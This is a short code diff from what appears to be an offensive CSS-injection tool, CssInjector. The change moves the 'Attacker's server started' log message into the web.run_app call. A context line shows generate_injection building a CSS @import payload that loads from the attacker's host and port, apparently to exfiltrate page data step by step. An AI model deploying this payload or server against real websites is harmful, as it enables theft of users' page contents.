@@ -52,8 +52,9 @@ class CssInjector:
         self.port = args.port
         self.app = web.Application()
         self.app.middlewares.append(self.dynamic_router_middleware)
-        self.log("ok", f"Attacker's server started on {args.hostname}:{args.port}")
-        web.run_app(self.app, port=self.port)
+        web.run_app(self.app, port=self.port, print=self.log("ok", f"Attacker's server started on {args.hostname}:{args.port}"))
+        
+
 
     def generate_injection(self):
         stri = f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}');\n"
